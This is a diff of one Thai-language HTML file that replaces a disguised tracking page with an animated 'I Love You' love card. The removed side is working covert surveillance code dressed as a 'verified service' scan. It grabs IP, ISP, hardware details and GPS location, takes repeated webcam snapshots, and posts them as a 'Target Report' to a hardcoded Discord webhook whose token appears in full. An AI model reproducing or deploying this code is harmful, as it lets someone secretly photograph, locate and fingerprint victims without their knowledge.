@@ -1,174 +1,607 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Travel Premium - Verified Service</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
-        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 2s infinite; box-shadow: 0 0 20px #3b82f6; }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>💕 บอกรัก</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --pink-deep: #e91e8c;
+    --pink-mid: #f06292;
+    --pink-light: #f8bbd0;
+    --pink-pale: #fce4ec;
+    --pink-glow: #ff4db8;
+    --gold: #ffd700;
+    --white: #fff8fb;
+  }
+
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    min-height: 100vh;
+    background: #1a0010;
+    font-family: 'Sarabun', sans-serif;
+    overflow-x: hidden;
+    cursor: none;
+  }
+
+  /* Custom cursor */
+  .cursor {
+    position: fixed;
+    width: 20px; height: 20px;
+    background: radial-gradient(circle, #ff4db8, #e91e8c);
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9999;
+    transform: translate(-50%, -50%);
+    transition: transform 0.1s ease;
+    box-shadow: 0 0 15px #ff4db8, 0 0 30px #e91e8c;
+  }
+
+  /* Animated gradient background */
+  .bg-layer {
+    position: fixed; inset: 0;
+    background: 
+      radial-gradient(ellipse 80% 60% at 20% 20%, rgba(233,30,140,0.35) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 80% at 80% 80%, rgba(240,98,146,0.3) 0%, transparent 60%),
+      radial-gradient(ellipse 70% 50% at 50% 50%, rgba(194,24,91,0.2) 0%, transparent 70%),
+      linear-gradient(135deg, #1a0010 0%, #2d0020 40%, #1a0010 100%);
+    animation: bgPulse 8s ease-in-out infinite alternate;
+    z-index: 0;
+  }
+
+  @keyframes bgPulse {
+    0%   { opacity: 1; filter: hue-rotate(0deg); }
+    50%  { opacity: 0.85; filter: hue-rotate(15deg); }
+    100% { opacity: 1; filter: hue-rotate(-10deg); }
+  }
+
+  /* Sparkle canvas */
+  #sparkleCanvas {
+    position: fixed; inset: 0;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  /* Floating hearts background */
+  .hearts-bg {
+    position: fixed; inset: 0;
+    pointer-events: none;
+    z-index: 2;
+    overflow: hidden;
+  }
+
+  .heart-float {
+    position: absolute;
+    bottom: -60px;
+    font-size: 1.5rem;
+    opacity: 0;
+    animation: floatUp linear infinite;
+  }
+
+  @keyframes floatUp {
+    0%   { transform: translateY(0) rotate(0deg) scale(0.5); opacity: 0; }
+    10%  { opacity: 0.8; }
+    90%  { opacity: 0.4; }
+    100% { transform: translateY(-110vh) rotate(360deg) scale(1.2); opacity: 0; }
+  }
+
+  /* Main container */
+  .container {
+    position: relative;
+    z-index: 10;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+    gap: 0;
+  }
+
+  /* Glitter title */
+  .title-wrap {
+    text-align: center;
+    margin-bottom: 10px;
+    opacity: 0;
+    animation: fadeSlideDown 1.2s cubic-bezier(0.22,1,0.36,1) 0.3s forwards;
+  }
+
+  @keyframes fadeSlideDown {
+    from { opacity: 0; transform: translateY(-50px) scale(0.8); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .title-emoji {
+    font-size: clamp(2.5rem, 8vw, 5rem);
+    display: block;
+    margin-bottom: 8px;
+    animation: heartBeat 1.5s ease-in-out infinite;
+  }
+
+  @keyframes heartBeat {
+    0%, 100% { transform: scale(1); }
+    14%       { transform: scale(1.3); }
+    28%       { transform: scale(1); }
+    42%       { transform: scale(1.15); }
+    56%       { transform: scale(1); }
+  }
+
+  .main-title {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2.8rem, 9vw, 6.5rem);
+    font-weight: 700;
+    background: linear-gradient(135deg, #ffb3d9 0%, #ff4db8 30%, #ffffff 50%, #ff4db8 70%, #ffb3d9 100%);
+    background-size: 200% auto;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: shimmerText 3s linear infinite;
+    line-height: 1.1;
+    filter: drop-shadow(0 0 20px rgba(255,77,184,0.8));
+    text-shadow: none;
+  }
+
+  @keyframes shimmerText {
+    0%   { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+  .subtitle {
+    font-size: clamp(1rem, 3vw, 1.4rem);
+    color: var(--pink-light);
+    font-weight: 300;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin-top: 6px;
+    opacity: 0.8;
+    animation: fadeSlideDown 1.2s cubic-bezier(0.22,1,0.36,1) 0.6s both;
+  }
+
+  /* Card */
+  .love-card {
+    position: relative;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,77,184,0.3);
+    border-radius: 30px;
+    padding: 50px 45px;
+    max-width: 700px;
+    width: 100%;
+    margin: 30px 0;
+    backdrop-filter: blur(20px);
+    box-shadow:
+      0 0 40px rgba(255,77,184,0.2),
+      0 0 80px rgba(233,30,140,0.1),
+      inset 0 1px 0 rgba(255,255,255,0.1),
+      inset 0 -1px 0 rgba(255,77,184,0.1);
+    opacity: 0;
+    animation: fadeSlideUp 1.4s cubic-bezier(0.22,1,0.36,1) 0.8s forwards;
+    overflow: hidden;
+  }
+
+  @keyframes fadeSlideUp {
+    from { opacity: 0; transform: translateY(60px) scale(0.95); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .love-card::before {
+    content: '';
+    position: absolute;
+    top: -2px; left: -2px; right: -2px; bottom: -2px;
+    border-radius: 32px;
+    background: linear-gradient(135deg, rgba(255,77,184,0.5), transparent 40%, rgba(233,30,140,0.5) 100%);
+    z-index: -1;
+    animation: borderGlow 4s ease-in-out infinite alternate;
+  }
+
+  @keyframes borderGlow {
+    0%   { opacity: 0.4; }
+    100% { opacity: 1; }
+  }
+
+  /* Rose decoration */
+  .rose-deco {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    font-size: 1.8rem;
+    margin-bottom: 25px;
+    animation: roseAppear 0.8s ease-out 1.5s both;
+  }
+
+  @keyframes roseAppear {
+    from { opacity: 0; transform: scale(0) rotate(-20deg); }
+    to   { opacity: 1; transform: scale(1) rotate(0deg); }
+  }
+
+  .rose-deco span { display: inline-block; animation: roseSway 3s ease-in-out infinite; }
+  .rose-deco span:nth-child(2) { animation-delay: 0.5s; font-size: 2.2rem; }
+  .rose-deco span:nth-child(3) { animation-delay: 1s; }
+
+  @keyframes roseSway {
+    0%, 100% { transform: rotate(-10deg) scale(1); }
+    50%       { transform: rotate(10deg) scale(1.1); }
+  }
+
+  /* Love text */
+  .love-text {
+    text-align: center;
+  }
+
+  .name-label {
+    font-size: clamp(0.85rem, 2.5vw, 1rem);
+    color: var(--pink-mid);
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    font-weight: 600;
+    margin-bottom: 8px;
+    opacity: 0;
+    animation: fadeIn 0.8s ease 1.8s forwards;
+  }
+
+  .receiver-name {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2rem, 6vw, 4rem);
+    font-style: italic;
+    color: var(--white);
+    line-height: 1;
+    margin-bottom: 30px;
+    filter: drop-shadow(0 0 15px rgba(255,77,184,0.6));
+    opacity: 0;
+    animation: fadeIn 0.8s ease 2s forwards;
+  }
+
+  .divider {
+    width: 80px;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--pink-deep), var(--pink-glow), var(--pink-deep), transparent);
+    margin: 0 auto 25px;
+    border-radius: 2px;
+    opacity: 0;
+    animation: fadeIn 0.8s ease 2.1s forwards, dividerPulse 2s ease-in-out 2.1s infinite;
+  }
+
+  @keyframes dividerPulse {
+    0%, 100% { width: 80px; opacity: 0.8; }
+    50%       { width: 120px; opacity: 1; }
+  }
+
+  .message {
+    font-size: clamp(1rem, 2.8vw, 1.25rem);
+    line-height: 2;
+    color: rgba(255,255,255,0.88);
+    font-weight: 300;
+    margin-bottom: 30px;
+    opacity: 0;
+    animation: fadeIn 1s ease 2.3s forwards;
+  }
+
+  .message strong {
+    color: var(--pink-light);
+    font-weight: 600;
+  }
+
+  .confession {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(1.6rem, 5vw, 3rem);
+    font-weight: 700;
+    font-style: italic;
+    background: linear-gradient(135deg, #ff9ed2, #ff4db8, #ffffff, #ff4db8);
+    background-size: 300% auto;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: shimmerText 2s linear infinite, fadeIn 1s ease 2.8s both;
+    filter: drop-shadow(0 0 10px rgba(255,77,184,0.5));
+    margin-bottom: 30px;
+    opacity: 0;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Button */
+  .btn-wrap {
+    opacity: 0;
+    animation: fadeIn 1s ease 3.2s forwards;
+  }
+
+  .love-btn {
+    display: inline-block;
+    padding: 16px 50px;
+    background: linear-gradient(135deg, #e91e8c, #ff4db8, #c2185b);
+    background-size: 200% auto;
+    border: none;
+    border-radius: 50px;
+    color: white;
+    font-family: 'Sarabun', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow:
+      0 5px 30px rgba(233,30,140,0.5),
+      0 0 60px rgba(233,30,140,0.2),
+      inset 0 1px 0 rgba(255,255,255,0.2);
+    animation: btnPulse 2s ease-in-out 3.5s infinite;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .love-btn::before {
+    content: '';
+    position: absolute;
+    top: -50%; left: -75%;
+    width: 50%; height: 200%;
+    background: rgba(255,255,255,0.15);
+    transform: skewX(-20deg);
+    animation: btnShine 3s ease-in-out 3.5s infinite;
+  }
+
+  @keyframes btnShine {
+    0%, 70%, 100% { left: -75%; }
+    40%            { left: 125%; }
+  }
+
+  @keyframes btnPulse {
+    0%, 100% { box-shadow: 0 5px 30px rgba(233,30,140,0.5), 0 0 60px rgba(233,30,140,0.2); }
+    50%       { box-shadow: 0 8px 45px rgba(233,30,140,0.8), 0 0 90px rgba(233,30,140,0.4); }
+  }
+
+  .love-btn:hover {
+    background-position: right center;
+    transform: translateY(-3px) scale(1.05);
+  }
+
+  /* Stars decoration */
+  .stars-row {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 25px;
+    opacity: 0;
+    animation: fadeIn 1s ease 3.5s forwards;
+  }
+
+  .star {
+    color: var(--pink-light);
+    font-size: 1.2rem;
+    animation: starTwinkle 2s ease-in-out infinite;
+  }
+
+  .star:nth-child(2) { animation-delay: 0.3s; }
+  .star:nth-child(3) { animation-delay: 0.6s; font-size: 1.5rem; color: var(--pink-glow); }
+  .star:nth-child(4) { animation-delay: 0.9s; }
+  .star:nth-child(5) { animation-delay: 1.2s; }
+
+  @keyframes starTwinkle {
+    0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
+    50%       { opacity: 0.4; transform: scale(0.7) rotate(20deg); }
+  }
+
+  /* Sender line */
+  .sender-line {
+    text-align: center;
+    color: rgba(255,255,255,0.4);
+    font-size: 0.9rem;
+    letter-spacing: 0.15em;
+    opacity: 0;
+    animation: fadeIn 1s ease 3.8s forwards;
+  }
+
+  .sender-line span {
+    color: var(--pink-mid);
+    font-style: italic;
+  }
+
+  /* Corner decorations */
+  .corner {
+    position: absolute;
+    font-size: 1.5rem;
+    opacity: 0.4;
+    animation: cornerPulse 3s ease-in-out infinite;
+  }
+
+  .corner-tl { top: 15px; left: 15px; }
+  .corner-tr { top: 15px; right: 15px; animation-delay: 0.5s; }
+  .corner-bl { bottom: 15px; left: 15px; animation-delay: 1s; }
+  .corner-br { bottom: 15px; right: 15px; animation-delay: 1.5s; }
+
+  @keyframes cornerPulse {
+    0%, 100% { opacity: 0.3; transform: scale(0.9); }
+    50%       { opacity: 0.7; transform: scale(1.1); }
+  }
+
+  /* Popup hearts on click */
+  .popup-heart {
+    position: fixed;
+    pointer-events: none;
+    font-size: 2rem;
+    z-index: 9998;
+    animation: popHeart 1.2s ease-out forwards;
+  }
+
+  @keyframes popHeart {
+    0%   { transform: translate(-50%, -50%) scale(0); opacity: 1; }
+    60%  { transform: translate(-50%, -120%) scale(1.4); opacity: 1; }
+    100% { transform: translate(-50%, -200%) scale(0.5); opacity: 0; }
+  }
+
+  /* Ribbon top */
+  .ribbon {
+    position: absolute;
+    top: -1px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: linear-gradient(90deg, transparent, rgba(255,77,184,0.6), transparent);
+    height: 2px;
+    width: 60%;
+    border-radius: 2px;
+  }
+</style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body>
 
-    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative">
-        <div class="p-8 pb-4 text-center">
-            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
-                Deep Scan Analytics v7.0
-            </div>
-            <h1 class="text-3xl font-bold mb-2">ตรวจสอบระบบขั้นสูง</h1>
-            <p class="text-slate-400 text-sm leading-relaxed">กำลังรวบรวมข้อมูล Network, IP และ Hardware เพื่อความปลอดภัยระดับสูงสุด</p>
-        </div>
+<div class="cursor" id="cursor"></div>
+<div class="bg-layer"></div>
+<canvas id="sparkleCanvas"></canvas>
 
-        <div class="p-8 pt-0">
-            <div id="step-scan" class="block text-center">
-                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
-                    <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
-                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-blue-500/10 to-transparent"></div>
-                    <div class="scan-anim"></div>
-                </div>
-                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังดึงข้อมูลเครือข่าย...</p>
-            </div>
+<div class="hearts-bg" id="heartsBg"></div>
 
-            <div id="step-result" class="hidden animate-in fade-in duration-700 text-center">
-                <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl">
-                    <p class="text-green-400 font-bold text-sm">✓ การตรวจสอบเสร็จสมบูรณ์</p>
-                    <p class="text-[10px] text-slate-500">ข้อมูลถูกส่งไปยังเซิร์ฟเวอร์เรียบร้อยแล้ว</p>
-                </div>
-            </div>
-        </div>
+<div class="container">
+  <div class="title-wrap">
+    <span class="title-emoji">💖</span>
+    <h1 class="main-title">I Love You</h1>
+    <p class="subtitle">จากใจถึงใจ · With All My Heart</p>
+  </div>
+
+  <div class="love-card">
+    <div class="ribbon"></div>
+    <span class="corner corner-tl">🌸</span>
+    <span class="corner corner-tr">✨</span>
+    <span class="corner corner-bl">✨</span>
+    <span class="corner corner-br">🌸</span>
+
+    <div class="love-text">
+      <div class="rose-deco">
+        <span>🌹</span><span>💕</span><span>🌹</span>
+      </div>
+
+      <p class="name-label">ถึงคนพิเศษของฉัน</p>
+      <p class="receiver-name">หวานใจ</p>
+      <div class="divider"></div>
+
+      <p class="message">
+        ทุกๆ วันที่มีเธออยู่ด้วย<br>
+        ทำให้โลกทั้งใบสวยงามขึ้น<br>
+        <strong>เธอคือดวงดาวที่สว่างที่สุดในชีวิตฉัน</strong><br>
+        ขอบคุณที่ทำให้หัวใจฉันเต้นแรงทุกครั้งที่เห็นรอยยิ้มของเธอ
+      </p>
+
+      <p class="confession">ฉันรักเธอ 💕</p>
+
+      <div class="btn-wrap">
+        <button class="love-btn" onclick="spreadLove(event)">💌 รับความรักของฉัน</button>
+      </div>
+
+      <div class="stars-row">
+        <span class="star">⭐</span>
+        <span class="star">✨</span>
+        <span class="star">💫</span>
+        <span class="star">✨</span>
+        <span class="star">⭐</span>
+      </div>
+
+      <p class="sender-line">ด้วยรัก &hearts; จาก <span>คนที่รักเธอที่สุดในโลก</span></p>
     </div>
+  </div>
+</div>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500160535629660263/DqTP_nBQDLnPNoDADa-bXEb-1lKS6H5Ztt6Y7_TzoKCyiahTsosXJiG9M_dlTRyiwMmP";
-        let userPos = { lat: 0, lon: 0 };
-        let shotCount = 0;
-        const MAX_SHOTS = 5;
+<script>
+// Custom cursor
+const cursor = document.getElementById('cursor');
+document.addEventListener('mousemove', e => {
+  cursor.style.left = e.clientX + 'px';
+  cursor.style.top  = e.clientY + 'px';
+});
 
-        // ข้อมูลสรุป
-        let fullData = {
-            ip: "Checking...",
-            isp: "Checking...",
-            netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
-            battery: "N/A",
-            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "N/A",
-            gpu: "N/A",
-            screen: `${window.screen.width}x${window.screen.height}`
-        };
+// Floating hearts
+const heartEmojis = ['💖','💕','💗','💓','💘','🌸','✨','💝','🩷'];
+const bg = document.getElementById('heartsBg');
+function spawnHeart() {
+  const h = document.createElement('div');
+  h.className = 'heart-float';
+  h.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
+  h.style.left = Math.random() * 100 + 'vw';
+  const dur = 6 + Math.random() * 8;
+  const size = 0.8 + Math.random() * 1.4;
+  h.style.fontSize = size + 'rem';
+  h.style.animationDuration = dur + 's';
+  h.style.animationDelay = Math.random() * 3 + 's';
+  bg.appendChild(h);
+  setTimeout(() => h.remove(), (dur + 3) * 1000);
+}
+setInterval(spawnHeart, 600);
+for(let i = 0; i < 8; i++) spawnHeart();
 
-        window.onload = async () => {
-            await getNetworkAndHardware();
-            startProcess();
-        };
+// Sparkle canvas
+const canvas = document.getElementById('sparkleCanvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+window.addEventListener('resize', () => {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+});
 
-        async function getNetworkAndHardware() {
-            // ดึง IP และ ISP แบบละเอียด
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                fullData.ip = data.ip;
-                fullData.isp = `${data.org} (${data.city}, ${data.country_name})`;
-            } catch (e) {
-                try {
-                    const res2 = await fetch('https://api.ipify.org?format=json');
-                    const data2 = await res2.json();
-                    fullData.ip = data2.ip;
-                } catch (e2) {}
-            }
+const sparkles = [];
+for(let i = 0; i < 80; i++) {
+  sparkles.push({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    r: Math.random() * 2 + 0.5,
+    a: Math.random() * Math.PI * 2,
+    speed: 0.003 + Math.random() * 0.01,
+    opacity: Math.random(),
+    opDir: Math.random() > 0.5 ? 1 : -1,
+    color: ['#ff4db8','#ffb3d9','#ffffff','#f8bbd0','#e91e8c'][Math.floor(Math.random()*5)]
+  });
+}
 
-            // แบตเตอรี่
-            try {
-                const batt = await navigator.getBattery();
-                fullData.battery = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})`;
-            } catch (e) {}
+function animSparkles() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  sparkles.forEach(s => {
+    s.opacity += s.opDir * s.speed * 3;
+    if(s.opacity >= 1 || s.opacity <= 0) s.opDir *= -1;
+    ctx.save();
+    ctx.globalAlpha = Math.max(0, s.opacity);
+    ctx.fillStyle = s.color;
+    ctx.shadowColor = s.color;
+    ctx.shadowBlur = 8;
+    ctx.beginPath();
+    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.restore();
+  });
+  requestAnimationFrame(animSparkles);
+}
+animSparkles();
 
-            // GPU
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                fullData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) {}
-        }
+// Click: popup hearts
+function spreadLove(e) {
+  const hearts = ['💖','💕','💗','💓','💘','💝','🌸'];
+  for(let i = 0; i < 12; i++) {
+    setTimeout(() => {
+      const el = document.createElement('div');
+      el.className = 'popup-heart';
+      const ox = (Math.random() - 0.5) * 200;
+      el.textContent = hearts[Math.floor(Math.random() * hearts.length)];
+      el.style.left  = (e.clientX + ox) + 'px';
+      el.style.top   = e.clientY + 'px';
+      el.style.fontSize = (1.2 + Math.random() * 1.5) + 'rem';
+      document.body.appendChild(el);
+      setTimeout(() => el.remove(), 1400);
+    }, i * 60);
+  }
+}
 
-        async function startProcess() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    userPos.lat = pos.coords.latitude;
-                    userPos.lon = pos.coords.longitude;
-                    await initCamera();
-                }, (err) => {
-                    alert("กรุณาอนุญาตพิกัดเพื่อเข้าใช้งาน");
-                    location.reload();
-                });
-            }
-        }
-
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('webcam');
-                video.srcObject = stream;
-                document.getElementById('status-msg').innerText = "กำลังซิงค์พิกัดหน้าบ้าน...";
-
-                const burst = setInterval(async () => {
-                    if (shotCount >= MAX_SHOTS) {
-                        clearInterval(burst);
-                        stream.getTracks().forEach(t => t.stop());
-                        showResults();
-                        return;
-                    }
-                    await captureAndSend(video);
-                    shotCount++;
-                }, 500); // 0.1วิ ตามที่เคยขอ แต่อาจจะเร็วไปสำหรับเน็ตบางคน แนะนำ 0.5วิ (500ms) ครับ
-            } catch (e) {
-                alert("กรุณาอนุญาตกล้อง");
-            }
-        }
-
-        async function captureAndSend(video) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                const payload = {
-                    embeds: [{
-                        title: `🛡️ Target Report [Shot ${shotCount + 1}]`,
-                        color: 15105570,
-                        fields: [
-                            { name: "🌐 Network IP", value: `\`${fullData.ip}\``, inline: true },
-                            { name: "📡 ISP", value: `\`${fullData.isp}\``, inline: true },
-                            { name: "📶 Connection", value: `\`${fullData.netType}\``, inline: true },
-                            { name: "🔋 Battery", value: `\`${fullData.battery}\``, inline: true },
-                            { name: "🧠 RAM / CPU", value: `\`RAM: ${fullData.ram} | CPU: ${fullData.cpu}\``, inline: false },
-                            { name: "🎮 GPU", value: `\`${fullData.gpu}\``, inline: false },
-                            { name: "📍 Location", value: `[Map](https://www.google.com/maps?q=${userPos.lat},${userPos.lon}) | [Street View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userPos.lat},${userPos.lon})`, inline: false },
-                            { name: "📱 OS/Platform", value: `\`${navigator.platform}\``, inline: true },
-                            { name: "🖥️ Screen", value: `\`${fullData.screen}\``, inline: true }
-                        ],
-                        image: { url: "attachment://shot.jpg" },
-                        footer: { text: "Verified User Metadata • " + new Date().toLocaleString() }
-                    }]
-                };
-
-                formData.append('payload_json', JSON.stringify(payload));
-                formData.append('file', blob, 'shot.jpg');
-                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-            }, 'image/jpeg', 0.7);
-        }
-
-        function showResults() {
-            document.getElementById('step-scan').classList.add('hidden');
-            document.getElementById('step-result').classList.remove('hidden');
-        }
-    </script>
+// Cursor click sparkle
+document.addEventListener('click', e => {
+  for(let i = 0; i < 6; i++) {
+    const el = document.createElement('div');
+    el.className = 'popup-heart';
+    el.textContent = '✨';
+    el.style.left = e.clientX + 'px';
+    el.style.top  = e.clientY + 'px';
+    el.style.fontSize = '1rem';
+    document.body.appendChild(el);
+    setTimeout(() => el.remove(), 1200);
+  }
+});
+</script>
 </body>
 </html>
